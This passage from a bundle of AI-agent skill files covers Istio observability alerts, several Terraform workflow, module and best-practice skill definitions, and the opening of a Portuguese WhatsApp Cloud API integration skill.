  name: mesh-default
  namespace: istio-system
spec:
  tracing:
    - providers:
        - name: otel
      randomSamplingPercentage: 10
```

## Alerting Rules

```yaml
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: mesh-alerts
  namespace: istio-system
spec:
  groups:
    - name: mesh.rules
      rules:
        - alert: HighErrorRate
          expr: |
            sum(rate(istio_requests_total{response_code=~"5.."}[5m])) by (destination_service_name)
            / sum(rate(istio_requests_total[5m])) by (destination_service_name) > 0.05
          for: 5m
          labels:
            severity: critical
          annotations:
            summary: "High error rate for {{ $labels.destination_service_name }}"

        - alert: HighLatency
          expr: |
            histogram_quantile(0.99, sum(rate(istio_request_duration_milliseconds_bucket[5m]))
            by (le, destination_service_name)) > 1000
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "High P99 latency for {{ $labels.destination_service_name }}"

        - alert: MeshCertExpiring
          expr: |
            (certmanager_certificate_expiration_timestamp_seconds - time()) / 86400 < 7
          labels:
            severity: warning
          annotations:
            summary: "Mesh certificate expiring in less than 7 days"
```

## Best Practices

### Do's
- **Sample appropriately** - 100% in dev, 1-10% in prod
- **Use trace context** - Propagate headers consistently
- **Set up alerts** - For golden signals
- **Correlate metrics/traces** - Use exemplars
- **Retain strategically** - Hot/cold storage tiers

### Don'ts
- **Don't over-sample** - Storage costs add up
- **Don't ignore cardinality** - Limit label values
- **Don't skip dashboards** - Visualize dependencies
- **Don't forget costs** - Monitor observability costs

## Resources

- [Istio Observability](https://istio.io/latest/docs/tasks/observability/)
- [Linkerd Observability](https://linkerd.io/2.14/features/dashboard/)
- [OpenTelemetry](https://opentelemetry.io/)
- [Kiali](https://kiali.io/)

---

## Merged Reference (legacy variant)

---
name: terraform-infrastructure
description: "Terraform infrastructure as code workflow for provisioning cloud resources, creating reusable modules, and managing infrastructure at scale."
category: granular-workflow-bundle
risk: safe
source: personal
date_added: "2026-02-27"
---

# Terraform Infrastructure Workflow

## Overview

Specialized workflow for infrastructure as code using Terraform including resource provisioning, module creation, state management, and multi-environment deployments.

## When to Use This Workflow

Use this workflow when:
- Provisioning cloud infrastructure
- Creating Terraform modules
- Managing multi-environment infra
- Implementing IaC best practices
- Setting up Terraform workflows

## Workflow Phases

### Phase 1: Terraform Setup

#### Skills to Invoke
- `terraform-skill` - Terraform basics
- `terraform-specialist` - Advanced Terraform

#### Actions
1. Initialize Terraform
2. Configure backend
3. Set up providers
4. Configure variables
5. Create outputs

#### Copy-Paste Prompts
```
Use @terraform-skill to set up Terraform project
```

### Phase 2: Resource Provisioning

#### Skills to Invoke
- `terraform-module-library` - Terraform modules
- `cloud-architect` - Cloud architecture

#### Actions
1. Design infrastructure
2. Create resource definitions
3. Configure networking
4. Set up compute
5. Add storage

#### Copy-Paste Prompts
```
Use @terraform-module-library to provision cloud resources
```

### Phase 3: Module Creation

#### Skills to Invoke
- `terraform-module-library` - Module creation

#### Actions
1. Design module interface
2. Create module structure
3. Define variables/outputs
4. Add documentation
5. Test module

#### Copy-Paste Prompts
```
Use @terraform-module-library to create reusable Terraform module
```

### Phase 4: State Management

#### Skills to Invoke
- `terraform-specialist` - State management

#### Actions
1. Configure remote backend
2. Set up state locking
3. Implement workspaces
4. Configure state access
5. Set up backup

#### Copy-Paste Prompts
```
Use @terraform-specialist to configure Terraform state
```

### Phase 5: Multi-Environment

#### Skills to Invoke
- `terraform-specialist` - Multi-environment

#### Actions
1. Design environment structure
2. Create environment configs
3. Set up variable files
4. Configure isolation
5. Test deployments

#### Copy-Paste Prompts
```
Use @terraform-specialist to set up multi-environment Terraform
```

### Phase 6: CI/CD Integration

#### Skills to Invoke
- `cicd-automation-workflow-automate` - CI/CD
- `github-actions-templates` - GitHub Actions

#### Actions
1. Create CI pipeline
2. Configure plan/apply
3. Set up approvals
4. Add validation
5. Test pipeline

#### Copy-Paste Prompts
```
Use @cicd-automation-workflow-automate to create Terraform CI/CD
```

### Phase 7: Security

#### Skills to Invoke
- `secrets-management` - Secrets management
- `terraform-specialist` - Security

#### Actions
1. Configure secrets
2. Set up encryption
3. Implement policies
4. Add compliance
5. Audit access

#### Copy-Paste Prompts
```
Use @secrets-management to secure Terraform secrets
```

## Quality Gates

- [ ] Resources provisioned
- [ ] Modules working
- [ ] State configured
- [ ] Multi-env tested
- [ ] CI/CD working
- [ ] Security verified

## Related Workflow Bundles

- `cloud-devops` - Cloud/DevOps
- `kubernetes-deployment` - Kubernetes
- `aws-infrastructure` - AWS specific

---

## Merged Reference (legacy variant)

---
name: terraform-module-library
description: "Build reusable Terraform modules for AWS, Azure, and GCP infrastructure following infrastructure-as-code best practices. Use when creating infrastructure modules, standardizing cloud provisioning, ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Terraform Module Library

Production-ready Terraform module patterns for AWS, Azure, and GCP infrastructure.

## Do not use this skill when

- The task is unrelated to terraform module library
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Purpose

Create reusable, well-tested Terraform modules for common cloud infrastructure patterns across multiple cloud providers.

## Use this skill when

- Build reusable infrastructure components
- Standardize cloud resource provisioning
- Implement infrastructure as code best practices
- Create multi-cloud compatible modules
- Establish organizational Terraform standards

## Module Structure

```
terraform-modules/
├── aws/
│   ├── vpc/
│   ├── eks/
│   ├── rds/
│   └── s3/
├── azure/
│   ├── vnet/
│   ├── aks/
│   └── storage/
└── gcp/
    ├── vpc/
    ├── gke/
    └── cloud-sql/
```

## Standard Module Pattern

```
module-name/
├── main.tf          # Main resources
├── variables.tf     # Input variables
├── outputs.tf       # Output values
├── versions.tf      # Provider versions
├── README.md        # Documentation
├── examples/        # Usage examples
│   └── complete/
│       ├── main.tf
│       └── variables.tf
└── tests/           # Terratest files
    └── module_test.go
```

## AWS VPC Module Example

**main.tf:**
```hcl
resource "aws_vpc" "main" {
  cidr_block           = var.cidr_block
  enable_dns_hostnames = var.enable_dns_hostnames
  enable_dns_support   = var.enable_dns_support

  tags = merge(
    {
      Name = var.name
    },
    var.tags
  )
}

resource "aws_subnet" "private" {
  count             = length(var.private_subnet_cidrs)
  vpc_id            = aws_vpc.main.id
  cidr_block        = var.private_subnet_cidrs[count.index]
  availability_zone = var.availability_zones[count.index]

  tags = merge(
    {
      Name = "${var.name}-private-${count.index + 1}"
      Tier = "private"
    },
    var.tags
  )
}

resource "aws_internet_gateway" "main" {
  count  = var.create_internet_gateway ? 1 : 0
  vpc_id = aws_vpc.main.id

  tags = merge(
    {
      Name = "${var.name}-igw"
    },
    var.tags
  )
}
```

**variables.tf:**
```hcl
variable "name" {
  description = "Name of the VPC"
  type        = string
}

variable "cidr_block" {
  description = "CIDR block for VPC"
  type        = string
  validation {
    condition     = can(regex("^([0-9]{1,3}\\.){3}[0-9]{1,3}/[0-9]{1,2}$", var.cidr_block))
    error_message = "CIDR block must be valid IPv4 CIDR notation."
  }
}

variable "availability_zones" {
  description = "List of availability zones"
  type        = list(string)
}

variable "private_subnet_cidrs" {
  description = "CIDR blocks for private subnets"
  type        = list(string)
  default     = []
}

variable "enable_dns_hostnames" {
  description = "Enable DNS hostnames in VPC"
  type        = bool
  default     = true
}

variable "tags" {
  description = "Additional tags"
  type        = map(string)
  default     = {}
}
```

**outputs.tf:**
```hcl
output "vpc_id" {
  description = "ID of the VPC"
  value       = aws_vpc.main.id
}

output "private_subnet_ids" {
  description = "IDs of private subnets"
  value       = aws_subnet.private[*].id
}

output "vpc_cidr_block" {
  description = "CIDR block of VPC"
  value       = aws_vpc.main.cidr_block
}
```

## Best Practices

1. **Use semantic versioning** for modules
2. **Document all variables** with descriptions
3. **Provide examples** in examples/ directory
4. **Use validation blocks** for input validation
5. **Output important attributes** for module composition
6. **Pin provider versions** in versions.tf
7. **Use locals** for computed values
8. **Implement conditional resources** with count/for_each
9. **Test modules** with Terratest
10. **Tag all resources** consistently

## Module Composition

```hcl
module "vpc" {
  source = "../../modules/aws/vpc"

  name               = "production"
  cidr_block         = "10.0.0.0/16"
  availability_zones = ["us-west-2a", "us-west-2b", "us-west-2c"]

  private_subnet_cidrs = [
    "10.0.1.0/24",
    "10.0.2.0/24",
    "10.0.3.0/24"
  ]

  tags = {
    Environment = "production"
    ManagedBy   = "terraform"
  }
}

module "rds" {
  source = "../../modules/aws/rds"

  identifier     = "production-db"
  engine         = "postgres"
  engine_version = "15.3"
  instance_class = "db.t3.large"

  vpc_id     = module.vpc.vpc_id
  subnet_ids = module.vpc.private_subnet_ids

  tags = {
    Environment = "production"
  }
}
```

## Reference Files

- `assets/vpc-module/` - Complete VPC module example
- `assets/rds-module/` - RDS module example
- `references/aws-modules.md` - AWS module patterns
- `references/azure-modules.md` - Azure module patterns
- `references/gcp-modules.md` - GCP module patterns

## Testing

```go
// tests/vpc_test.go
package test

import (
    "testing"
    "github.com/gruntwork-io/terratest/modules/terraform"
    "github.com/stretchr/testify/assert"
)

func TestVPCModule(t *testing.T) {
    terraformOptions := &terraform.Options{
        TerraformDir: "../examples/complete",
    }

    defer terraform.Destroy(t, terraformOptions)
    terraform.InitAndApply(t, terraformOptions)

    vpcID := terraform.Output(t, terraformOptions, "vpc_id")
    assert.NotEmpty(t, vpcID)
}
```

## Related Skills

- `multi-cloud-architecture` - For architectural decisions
- `cost-optimization` - For cost-effective designs

---

## Merged Reference (legacy variant)

---
name: terraform-skill
description: "Terraform infrastructure as code best practices"
risk: safe
source: "https://github.com/antonbabenko/terraform-skill"
date_added: "2026-02-27"
---
# Terraform Skill

Comprehensive Terraform and OpenTofu guidance covering testing, modules, CI/CD, and production patterns. Based on terraform-best-practices.com and enterprise experience.

## When to Use This Skill

**Activate this skill when:**
- Creating new Terraform or OpenTofu configurations or modules
- Setting up testing infrastructure for IaC code
- Deciding between testing approaches (validate, plan, frameworks)
- Structuring multi-environment deployments
- Implementing CI/CD for infrastructure-as-code
- Reviewing or refactoring existing Terraform/OpenTofu projects
- Choosing between module patterns or state management approaches

**Don't use this skill for:**
- Basic Terraform/OpenTofu syntax questions (general model knowledge is enough)
- Provider-specific API reference (link to docs instead)
- Cloud platform questions unrelated to Terraform/OpenTofu

## Core Principles

### 1. Code Structure Philosophy

**Module Hierarchy:**

| Type | When to Use | Scope |
|------|-------------|-------|
| **Resource Module** | Single logical group of connected resources | VPC + subnets, Security group + rules |
| **Infrastructure Module** | Collection of resource modules for a purpose | Multiple resource modules in one region/account |
| **Composition** | Complete infrastructure | Spans multiple regions/accounts |

**Hierarchy:** Resource → Resource Module → Infrastructure Module → Composition

**Directory Structure:**
```
environments/        # Environment-specific configurations
├── prod/
├── staging/
└── dev/

modules/            # Reusable modules
├── networking/
├── compute/
└── data/

examples/           # Module usage examples (also serve as tests)
├── complete/
└── minimal/
```

**Key principle from terraform-best-practices.com:**
- Separate **environments** (prod, staging) from **modules** (reusable components)
- Use **examples/** as both documentation and integration test fixtures
- Keep modules small and focused (single responsibility)

**For detailed module architecture, see:** Code Patterns: Module Types & Hierarchy

### 2. Naming Conventions

**Resources:**
```hcl
# Good: Descriptive, contextual
resource "aws_instance" "web_server" { }
resource "aws_s3_bucket" "application_logs" { }

# Good: "this" for singleton resources (only one of that type)
resource "aws_vpc" "this" { }
resource "aws_security_group" "this" { }

# Avoid: Generic names for non-singletons
resource "aws_instance" "main" { }
resource "aws_s3_bucket" "bucket" { }
```

**Singleton Resources:**

Use `"this"` when your module creates only one resource of that type:

✅ DO:
```hcl
resource "aws_vpc" "this" {}           # Module creates one VPC
resource "aws_security_group" "this" {}  # Module creates one SG
```

❌ DON'T use "this" for multiple resources:
```hcl
resource "aws_subnet" "this" {}  # If creating multiple subnets
```

Use descriptive names when creating multiple resources of the same type.

**Variables:**
```hcl
# Prefix with context when needed
var.vpc_cidr_block          # Not just "cidr"
var.database_instance_class # Not just "instance_class"
```

**Files:**
- `main.tf` - Primary resources
- `variables.tf` - Input variables
- `outputs.tf` - Output values
- `versions.tf` - Provider versions
- `data.tf` - Data sources (optional)

## Testing Strategy Framework

### Decision Matrix: Which Testing Approach?

| Your Situation | Recommended Approach | Tools | Cost |
|----------------|---------------------|-------|------|
| **Quick syntax check** | Static analysis | `terraform validate`, `fmt` | Free |
| **Pre-commit validation** | Static + lint | `validate`, `tflint`, `trivy`, `checkov` | Free |
| **Terraform 1.6+, simple logic** | Native test framework | Built-in `terraform test` | Free-Low |
| **Pre-1.6, or Go expertise** | Integration testing | Terratest | Low-Med |
| **Security/compliance focus** | Policy as code | OPA, Sentinel | Free |
| **Cost-sensitive workflow** | Mock providers (1.7+) | Native tests + mocking | Free |
| **Multi-cloud, complex** | Full integration | Terratest + real infra | Med-High |

### Testing Pyramid for Infrastructure

```
        /\
       /  \          End-to-End Tests (Expensive)
      /____\         - Full environment deployment
     /      \        - Production-like setup
    /________\
   /          \      Integration Tests (Moderate)
  /____________\     - Module testing in isolation
 /              \    - Real resources in test account
/________________\   Static Analysis (Cheap)
                     - validate, fmt, lint
                     - Security scanning
```

### Native Test Best Practices (1.6+)

**Before generating test code:**

1. **Validate schemas with Terraform MCP:**
   ```
   Search provider docs → Get resource schema → Identify block types
   ```

2. **Choose correct command mode:**
   - `command = plan` - Fast, for input validation
   - `command = apply` - Required for computed values and set-type blocks

3. **Handle set-type blocks correctly:**
   - Cannot index with `[0]`
   - Use `for` expressions to iterate
   - Or use `command = apply` to materialize

**Common patterns:**
- S3 encryption rules: **set** (use for expressions)
- Lifecycle transitions: **set** (use for expressions)
- IAM policy statements: **set** (use for expressions)

**For detailed testing guides, see:**
- **Testing Frameworks Guide** - Deep dive into static analysis, native tests, and Terratest
- **Quick Reference** - Decision flowchart and command cheat sheet

## Code Structure Standards

### Resource Block Ordering

**Strict ordering for consistency:**
1. `count` or `for_each` FIRST (blank line after)
2. Other arguments
3. `tags` as last real argument
4. `depends_on` after tags (if needed)
5. `lifecycle` at the very end (if needed)

```hcl
# ✅ GOOD - Correct ordering
resource "aws_nat_gateway" "this" {
  count = var.create_nat_gateway ? 1 : 0

  allocation_id = aws_eip.this[0].id
  subnet_id     = aws_subnet.public[0].id

  tags = {
    Name = "${var.name}-nat"
  }

  depends_on = [aws_internet_gateway.this]

  lifecycle {
    create_before_destroy = true
  }
}
```

### Variable Block Ordering

1. `description` (ALWAYS required)
2. `type`
3. `default`
4. `validation`
5. `nullable` (when setting to false)

```hcl
variable "environment" {
  description = "Environment name for resource tagging"
  type        = string
  default     = "dev"

  validation {
    condition     = contains(["dev", "staging", "prod"], var.environment)
    error_message = "Environment must be one of: dev, staging, prod."
  }

  nullable = false
}
```

**For complete structure guidelines, see:** Code Patterns: Block Ordering & Structure

## Count vs For_Each: When to Use Each

### Quick Decision Guide

| Scenario | Use | Why |
|----------|-----|-----|
| Boolean condition (create or don't) | `count = condition ? 1 : 0` | Simple on/off toggle |
| Simple numeric replication | `count = 3` | Fixed number of identical resources |
| Items may be reordered/removed | `for_each = toset(list)` | Stable resource addresses |
| Reference by key | `for_each = map` | Named access to resources |
| Multiple named resources | `for_each` | Better maintainability |

### Common Patterns

**Boolean conditions:**
```hcl
# ✅ GOOD - Boolean condition
resource "aws_nat_gateway" "this" {
  count = var.create_nat_gateway ? 1 : 0
  # ...
}
```

**Stable addressing with for_each:**
```hcl
# ✅ GOOD - Removing "us-east-1b" only affects that subnet
resource "aws_subnet" "private" {
  for_each = toset(var.availability_zones)

  availability_zone = each.key
  # ...
}

# ❌ BAD - Removing middle AZ recreates all subsequent subnets
resource "aws_subnet" "private" {
  count = length(var.availability_zones)

  availability_zone = var.availability_zones[count.index]
  # ...
}
```

**For migration guides and detailed examples, see:** Code Patterns: Count vs For_Each

## Locals for Dependency Management

**Use locals to ensure correct resource deletion order:**

```hcl
# Problem: Subnets might be deleted after CIDR blocks, causing errors
# Solution: Use try() in locals to hint deletion order

locals {
  # References secondary CIDR first, falling back to VPC
  # Forces Terraform to delete subnets before CIDR association
  vpc_id = try(
    aws_vpc_ipv4_cidr_block_association.this[0].vpc_id,
    aws_vpc.this.id,
    ""
  )
}

resource "aws_vpc" "this" {
  cidr_block = "10.0.0.0/16"
}

resource "aws_vpc_ipv4_cidr_block_association" "this" {
  count = var.add_secondary_cidr ? 1 : 0

  vpc_id     = aws_vpc.this.id
  cidr_block = "10.1.0.0/16"
}

resource "aws_subnet" "public" {
  vpc_id     = local.vpc_id  # Uses local, not direct reference
  cidr_block = "10.1.0.0/24"
}
```

**Why this matters:**
- Prevents deletion errors when destroying infrastructure
- Ensures correct dependency order without explicit `depends_on`
- Particularly useful for VPC configurations with secondary CIDR blocks

**For detailed examples, see:** Code Patterns: Locals for Dependency Management

## Module Development

### Standard Module Structure

```
my-module/
├── README.md           # Usage documentation
├── main.tf             # Primary resources
├── variables.tf        # Input variables with descriptions
├── outputs.tf          # Output values
├── versions.tf         # Provider version constraints
├── examples/
│   ├── minimal/        # Minimal working example
│   └── complete/       # Full-featured example
└── tests/              # Test files
    └── module_test.tftest.hcl  # Or .go
```

### Best Practices Summary

**Variables:**
- ✅ Always include `description`
- ✅ Use explicit `type` constraints
- ✅ Provide sensible `default` values where appropriate
- ✅ Add `validation` blocks for complex constraints
- ✅ Use `sensitive = true` for secrets

**Outputs:**
- ✅ Always include `description`
- ✅ Mark sensitive outputs with `sensitive = true`
- ✅ Consider returning objects for related values
- ✅ Document what consumers should do with each output

**For detailed module patterns, see:**
- **Module Patterns Guide** - Variable best practices, output design, ✅ DO vs ❌ DON'T patterns
- **Quick Reference** - Resource naming, variable naming, file organization

## CI/CD Integration

### Recommended Workflow Stages

1. **Validate** - Format check + syntax validation + linting
2. **Test** - Run automated tests (native or Terratest)
3. **Plan** - Generate and review execution plan
4. **Apply** - Execute changes (with approvals for production)

### Cost Optimization Strategy

1. **Use mocking for PR validation** (free)
2. **Run integration tests only on main branch** (controlled cost)
3. **Implement auto-cleanup** (prevent orphaned resources)
4. **Tag all test resources** (track spending)

**For complete CI/CD templates, see:**
- **CI/CD Workflows Guide** - GitHub Actions, GitLab CI, Atlantis integration, cost optimization
- **Quick Reference** - Common CI/CD issues and solutions

## Security & Compliance

### Essential Security Checks

```bash
# Static security scanning
trivy config .
checkov -d .
```

### Common Issues to Avoid

❌ **Don't:**
- Store secrets in variables
- Use default VPC
- Skip encryption
- Open security groups to 0.0.0.0/0

✅ **Do:**
- Use AWS Secrets Manager / Parameter Store
- Create dedicated VPCs
- Enable encryption at rest
- Use least-privilege security groups

**For detailed security guidance, see:**
- **Security & Compliance Guide** - Trivy/Checkov integration, secrets management, state file security, compliance testing

## Version Management

### Version Constraint Syntax

```hcl
version = "5.0.0"      # Exact (avoid - inflexible)
version = "~> 5.0"     # Recommended: 5.0.x only
version = ">= 5.0"     # Minimum (risky - breaking changes)
```

### Strategy by Component

| Component | Strategy | Example |
|-----------|----------|---------|
| **Terraform** | Pin minor version | `required_version = "~> 1.9"` |
| **Providers** | Pin major version | `version = "~> 5.0"` |
| **Modules (prod)** | Pin exact version | `version = "5.1.2"` |
| **Modules (dev)** | Allow patch updates | `version = "~> 5.1"` |

### Update Workflow

```bash
# Lock versions initially
terraform init              # Creates .terraform.lock.hcl

# Update to latest within constraints
terraform init -upgrade     # Updates providers

# Review and test
terraform plan
```

**For detailed version management, see:** Code Patterns: Version Management

## Modern Terraform Features (1.0+)

### Feature Availability by Version

| Feature | Version | Use Case |
|---------|---------|----------|
| `try()` function | 0.13+ | Safe fallbacks, replaces `element(concat())` |
| `nullable = false` | 1.1+ | Prevent null values in variables |
| `moved` blocks | 1.1+ | Refactor without destroy/recreate |
| `optional()` with defaults | 1.3+ | Optional object attributes |
| Native testing | 1.6+ | Built-in test framework |
| Mock providers | 1.7+ | Cost-free unit testing |
| Provider functions | 1.8+ | Provider-specific data transformation |
| Cross-variable validation | 1.9+ | Validate relationships between variables |
| Write-only arguments | 1.11+ | Secrets never stored in state |

### Quick Examples

```hcl
# try() - Safe fallbacks (0.13+)
output "sg_id" {
  value = try(aws_security_group.this[0].id, "")
}

# optional() - Optional attributes with defaults (1.3+)
variable "config" {
  type = object({
    name    = string
    timeout = optional(number, 300)  # Default: 300
  })
}

# Cross-variable validation (1.9+)
variable "environment" { type = string }
variable "backup_days" {
  type = number
  validation {
    condition     = var.environment == "prod" ? var.backup_days >= 7 : true
    error_message = "Production requires backup_days >= 7"
  }
}
```

**For complete patterns and examples, see:** Code Patterns: Modern Terraform Features

## Version-Specific Guidance

### Terraform 1.0-1.5
- Use Terratest for testing
- No native testing framework available
- Focus on static analysis and plan validation

### Terraform 1.6+ / OpenTofu 1.6+
- **New:** Native `terraform test` / `tofu test` command
- Consider migrating from external frameworks for simple tests
- Keep Terratest only for complex integration tests

### Terraform 1.7+ / OpenTofu 1.7+
- **New:** Mock providers for unit testing
- Reduce cost by mocking external dependencies
- Use real integration tests for final validation

### Terraform vs OpenTofu

Both are fully supported by this skill. For licensing, governance, and feature comparison, see Quick Reference: Terraform vs OpenTofu.

## Detailed Guides

This skill uses **progressive disclosure** - essential information is in this main file, detailed guides are available when needed:

📚 **Reference Files:**
- **Testing Frameworks** - In-depth guide to static analysis, native tests, and Terratest
- **Module Patterns** - Module structure, variable/output best practices, ✅ DO vs ❌ DON'T patterns
- **CI/CD Workflows** - GitHub Actions, GitLab CI templates, cost optimization, automated cleanup
- **Security & Compliance** - Trivy/Checkov integration, secrets management, compliance testing
- **Quick Reference** - Command cheat sheets, decision flowcharts, troubleshooting guide

**How to use:** When you need detailed information on a topic, reference the appropriate guide. the assistant will load it on demand to provide comprehensive guidance.

## License

This skill is licensed under the **Apache License 2.0**. See the LICENSE file for full terms.

**Copyright © 2026 Anton Babenko**

---

## Merged Reference (legacy variant)

---
name: terraform-specialist
description: Expert Terraform/OpenTofu specialist mastering advanced IaC automation, state management, and enterprise infrastructure patterns.
risk: unknown
source: community
date_added: '2026-02-27'
---
You are a Terraform/OpenTofu specialist focused on advanced infrastructure automation, state management, and modern IaC practices.

## Use this skill when

- Designing Terraform/OpenTofu modules or environments
- Managing state backends, workspaces, or multi-cloud stacks
- Implementing policy-as-code and CI/CD automation for IaC

## Do not use this skill when

- You only need a one-off manual infrastructure change
- You are locked to a different IaC tool or platform
- You cannot store or secure state remotely

## Instructions

1. Define environments, providers, and security constraints.
2. Design modules and choose a remote state backend.
3. Implement plan/apply workflows with reviews and policies.
4. Validate drift, costs, and rollback strategies.

## Safety

- Always review plans before applying changes.
- Protect state files and avoid exposing secrets.

## Purpose
Expert Infrastructure as Code specialist with comprehensive knowledge of Terraform, OpenTofu, and modern IaC ecosystems. Masters advanced module design, state management, provider development, and enterprise-scale infrastructure automation. Specializes in GitOps workflows, policy as code, and complex multi-cloud deployments.

## Capabilities

### Terraform/OpenTofu Expertise
- **Core concepts**: Resources, data sources, variables, outputs, locals, expressions
- **Advanced features**: Dynamic blocks, for_each loops, conditional expressions, complex type constraints
- **State management**: Remote backends, state locking, state encryption, workspace strategies
- **Module development**: Composition patterns, versioning strategies, testing frameworks
- **Provider ecosystem**: Official and community providers, custom provider development
- **OpenTofu migration**: Terraform to OpenTofu migration strategies, compatibility considerations

### Advanced Module Design
- **Module architecture**: Hierarchical module design, root modules, child modules
- **Composition patterns**: Module composition, dependency injection, interface segregation
- **Reusability**: Generic modules, environment-specific configurations, module registries
- **Testing**: Terratest, unit testing, integration testing, contract testing
- **Documentation**: Auto-generated documentation, examples, usage patterns
- **Versioning**: Semantic versioning, compatibility matrices, upgrade guides

### State Management & Security
- **Backend configuration**: S3, Azure Storage, GCS, Terraform Cloud, Consul, etcd
- **State encryption**: Encryption at rest, encryption in transit, key management
- **State locking**: DynamoDB, Azure Storage, GCS, Redis locking mechanisms
- **State operations**: Import, move, remove, refresh, advanced state manipulation
- **Backup strategies**: Automated backups, point-in-time recovery, state versioning
- **Security**: Sensitive variables, secret management, state file security

### Multi-Environment Strategies
- **Workspace patterns**: Terraform workspaces vs separate backends
- **Environment isolation**: Directory structure, variable management, state separation
- **Deployment strategies**: Environment promotion, blue/green deployments
- **Configuration management**: Variable precedence, environment-specific overrides
- **GitOps integration**: Branch-based workflows, automated deployments

### Provider & Resource Management
- **Provider configuration**: Version constraints, multiple providers, provider aliases
- **Resource lifecycle**: Creation, updates, destruction, import, replacement
- **Data sources**: External data integration, computed values, dependency management
- **Resource targeting**: Selective operations, resource addressing, bulk operations
- **Drift detection**: Continuous compliance, automated drift correction
- **Resource graphs**: Dependency visualization, parallelization optimization

### Advanced Configuration Techniques
- **Dynamic configuration**: Dynamic blocks, complex expressions, conditional logic
- **Templating**: Template functions, file interpolation, external data integration
- **Validation**: Variable validation, precondition/postcondition checks
- **Error handling**: Graceful failure handling, retry mechanisms, recovery strategies
- **Performance optimization**: Resource parallelization, provider optimization

### CI/CD & Automation
- **Pipeline integration**: GitHub Actions, GitLab CI, Azure DevOps, Jenkins
- **Automated testing**: Plan validation, policy checking, security scanning
- **Deployment automation**: Automated apply, approval workflows, rollback strategies
- **Policy as Code**: Open Policy Agent (OPA), Sentinel, custom validation
- **Security scanning**: tfsec, Checkov, Terrascan, custom security policies
- **Quality gates**: Pre-commit hooks, continuous validation, compliance checking

### Multi-Cloud & Hybrid
- **Multi-cloud patterns**: Provider abstraction, cloud-agnostic modules
- **Hybrid deployments**: On-premises integration, edge computing, hybrid connectivity
- **Cross-provider dependencies**: Resource sharing, data passing between providers
- **Cost optimization**: Resource tagging, cost estimation, optimization recommendations
- **Migration strategies**: Cloud-to-cloud migration, infrastructure modernization

### Modern IaC Ecosystem
- **Alternative tools**: Pulumi, AWS CDK, Azure Bicep, Google Deployment Manager
- **Complementary tools**: Helm, Kustomize, Ansible integration
- **State alternatives**: Stateless deployments, immutable infrastructure patterns
- **GitOps workflows**: ArgoCD, Flux integration, continuous reconciliation
- **Policy engines**: OPA/Gatekeeper, native policy frameworks

### Enterprise & Governance
- **Access control**: RBAC, team-based access, service account management
- **Compliance**: SOC2, PCI-DSS, HIPAA infrastructure compliance
- **Auditing**: Change tracking, audit trails, compliance reporting
- **Cost management**: Resource tagging, cost allocation, budget enforcement
- **Service catalogs**: Self-service infrastructure, approved module catalogs

### Troubleshooting & Operations
- **Debugging**: Log analysis, state inspection, resource investigation
- **Performance tuning**: Provider optimization, parallelization, resource batching
- **Error recovery**: State corruption recovery, failed apply resolution
- **Monitoring**: Infrastructure drift monitoring, change detection
- **Maintenance**: Provider updates, module upgrades, deprecation management

## Behavioral Traits
- Follows DRY principles with reusable, composable modules
- Treats state files as critical infrastructure requiring protection
- Always plans before applying with thorough change review
- Implements version constraints for reproducible deployments
- Prefers data sources over hardcoded values for flexibility
- Advocates for automated testing and validation in all workflows
- Emphasizes security best practices for sensitive data and state management
- Designs for multi-environment consistency and scalability
- Values clear documentation and examples for all modules
- Considers long-term maintenance and upgrade strategies

## Knowledge Base
- Terraform/OpenTofu syntax, functions, and best practices
- Major cloud provider services and their Terraform representations
- Infrastructure patterns and architectural best practices
- CI/CD tools and automation strategies
- Security frameworks and compliance requirements
- Modern development workflows and GitOps practices
- Testing frameworks and quality assurance approaches
- Monitoring and observability for infrastructure

## Response Approach
1. **Analyze infrastructure requirements** for appropriate IaC patterns
2. **Design modular architecture** with proper abstraction and reusability
3. **Configure secure backends** with appropriate locking and encryption
4. **Implement comprehensive testing** with validation and security checks
5. **Set up automation pipelines** with proper approval workflows
6. **Document thoroughly** with examples and operational procedures
7. **Plan for maintenance** with upgrade strategies and deprecation handling
8. **Consider compliance requirements** and governance needs
9. **Optimize for performance** and cost efficiency

## Example Interactions
- "Design a reusable Terraform module for a three-tier web application with proper testing"
- "Set up secure remote state management with encryption and locking for multi-team environment"
- "Create CI/CD pipeline for infrastructure deployment with security scanning and approval workflows"
- "Migrate existing Terraform codebase to OpenTofu with minimal disruption"
- "Implement policy as code validation for infrastructure compliance and cost control"
- "Design multi-cloud Terraform architecture with provider abstraction"
- "Troubleshoot state corruption and implement recovery procedures"
- "Create enterprise service catalog with approved infrastructure modules"

---

## Merged Reference (legacy variant)

---
name: whatsapp-cloud-api
description: Integracao com WhatsApp Business Cloud API (Meta). Mensagens, templates, webhooks HMAC-SHA256, automacao de atendimento. Boilerplates Node.js e Python.
risk: critical
source: community
date_added: '2026-03-06'
author: renat
tags:
- messaging
- whatsapp
- meta
- webhooks
tools:
- agent-compatible
- agent-compatible
- agent-compatible
- agent-compatible
- agent-compatible
---

# WhatsApp Cloud API - Integracao Profissional

## Overview

Integracao com WhatsApp Business Cloud API (Meta). Mensagens, templates, webhooks HMAC-SHA256, automacao de atendimento. Boilerplates Node.js e Python.

## When to Use This Skill

- When the user mentions "whatsapp" or related topics
- When the user mentions "whatsapp business" or related topics
- When the user mentions "api whatsapp" or related topics
- When the user mentions "chatbot whatsapp" or related topics
- When the user mentions "mensagem whatsapp" or related topics
- When the user mentions "template whatsapp" or related topics

## Do Not Use This Skill When

- The task is unrelated to whatsapp cloud api
- A simpler, more specific tool can handle the request
- The user needs general-purpose assistance without domain expertise

## How It Works

Skill para implementar integracoes profissionais com WhatsApp Business usando a Cloud API oficial da Meta. Suporta Node.js/TypeScript e Python.

## Overview

A WhatsApp Cloud API e a API oficial da Meta para envio e recebimento de mensagens via WhatsApp Business. Desde outubro 2025, e a unica opcao suportada (a API On-Premises foi descontinuada).

**Versao da API:** Graph API v21.0 (2026)
**Base URL:** `https://graph.facebook.com/v21.0/{phone-number-id}/messages`
**Autenticacao:** Bearer Token (System User Token para producao)

**Pricing 2026 (por mensagem):**

| Categoria      | Custo             | Quando cobrado                          |
|----------------|-------------------|-----------------------------------------|
| Marketing      | $0.025-$0.1365    | Campanhas, promocoes                    |
| Utility        | $0.004-$0.0456    | Confirmacoes de pedido, atualizacoes    |
